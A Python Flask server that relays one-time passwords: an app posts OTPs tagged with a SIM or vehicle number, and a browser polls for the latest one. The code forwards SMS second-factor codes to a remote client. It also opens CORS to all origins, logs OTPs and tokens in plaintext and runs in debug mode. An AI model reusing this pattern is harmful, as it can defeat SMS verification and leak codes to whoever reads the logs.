from flask import Flask, request, jsonify
from flask_cors import CORS
from datetime import datetime

app = Flask(__name__)
CORS(app)

# Separate storage for Mobile and Vehicle OTPs
mobile_otps = []   # [{"otp":..., "token":..., "sim_number":..., "timestamp":...}]
vehicle_otps = []  # [{"otp":..., "token":..., "vehicle":..., "timestamp":...}]

# Track browser sessions
client_sessions = {}  # key -> {"first_request": datetime}


def now_str():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")


@app.route('/api/receive-otp', methods=['POST'])
def receive_otp():
    try:
        data = request.get_json(force=True)
        otp = (data.get('otp') or "").strip()
        sim_number = (data.get('sim_number') or "").strip().upper()
        token = (data.get('token') or "").strip()
        vehicle = (data.get('vehicle') or "").strip().upper()

        if not otp or not token:
            return jsonify({"status": "error", "message": "OTP and token required"}), 400

        entry = {
            "otp": otp,
            "token": token,
            "timestamp": datetime.now()
        }

        if vehicle:
            entry["vehicle"] = vehicle
            vehicle_otps.append(entry)
            print(f"[{now_str()}] 📦 Vehicle OTP stored - OTP: {otp}, Vehicle: {vehicle}, Token: {token}")
        else:
            entry["sim_number"] = sim_number or "UNKNOWNSIM"
            mobile_otps.append(entry)
            print(f"[{now_str()}] 📦 Mobile OTP stored - OTP: {otp}, SIM: {sim_number}, Token: {token}")

        return jsonify({"status": "success", "message": "OTP stored"}), 200

    except Exception as e:
        print("Error receiving from app:", e)
        return jsonify({"status": "error", "message": str(e)}), 400


@app.route('/api/get-latest-otp', methods=['GET'])
def get_latest_otp():
    token = (request.args.get('token') or "").strip()
    sim_number = (request.args.get('sim_number') or "").strip().upper()
    vehicle = (request.args.get('vehicle') or "").strip().upper()

    if not token or (not sim_number and not vehicle):
        return jsonify({"status": "error", "message": "token + sim_number OR token + vehicle required"}), 400

    # Normalize session key
    key = (token, sim_number if sim_number else vehicle)
    if key not in client_sessions:
        client_sessions[key] = {"first_request": datetime.now()}
        print(f"[{now_str()}] 🖥️ Browser started polling for {key}")
    session_time = client_sessions[key]["first_request"]

    if vehicle:
        # Vehicle OTP flow
        new_otps = [o for o in vehicle_otps
                    if o["token"] == token and o["vehicle"].upper() == vehicle and o["timestamp"] > session_time]

        if new_otps:
            latest = new_otps[-1]
            # Remove sent OTPs
            vehicle_otps[:] = [o for o in vehicle_otps
                               if not (o["token"] == token and o["vehicle"].upper() == vehicle)]
            client_sessions.pop(key, None)
            print(f"[{now_str()}] 🖥️ Vehicle OTP sent to browser: {latest['otp']} for {vehicle}")
            return jsonify({
                "status": "success",
                "otp": latest["otp"],
                "vehicle": latest["vehicle"],
                "timestamp": latest["timestamp"].strftime("%Y-%m-%d %H:%M:%S")
            }), 200
        else:
            return jsonify({"status": "empty", "message": "No new vehicle OTP"}), 200

    else:
        # Mobile OTP flow
        new_otps = [o for o in mobile_otps
                    if o["token"] == token and o["sim_number"].upper() == sim_number and o["timestamp"] > session_time]

        if new_otps:
            latest = new_otps[-1]
            # Remove sent OTPs
            mobile_otps[:] = [o for o in mobile_otps
                              if not (o["token"] == token and o["sim_number"].upper() == sim_number)]
            client_sessions.pop(key, None)
            print(f"[{now_str()}] 🖥️ Mobile OTP sent to browser: {latest['otp']} for SIM {sim_number}")
            return jsonify({
                "status": "success",
                "otp": latest["otp"],
                "sim_number": latest["sim_number"],
                "timestamp": latest["timestamp"].strftime("%Y-%m-%d %H:%M:%S")
            }), 200
        else:
            return jsonify({"status": "empty", "message": "No new mobile OTP"}), 200


@app.route('/api/status', methods=['GET'])
def status():
    last_mobile = mobile_otps[-1]["timestamp"].strftime("%Y-%m-%d %H:%M:%S") if mobile_otps else "None"
    last_vehicle = vehicle_otps[-1]["timestamp"].strftime("%Y-%m-%d %H:%M:%S") if vehicle_otps else "None"

    return jsonify({
        "status": "active" if (mobile_otps or vehicle_otps) else "idle",
        "last_mobile_otp_time": last_mobile,
        "last_vehicle_otp_time": last_vehicle,
        "mobile_otp_count": len(mobile_otps),
        "vehicle_otp_count": len(vehicle_otps)
    }), 200


if __name__ == '__main__':
    app.run(debug=True)
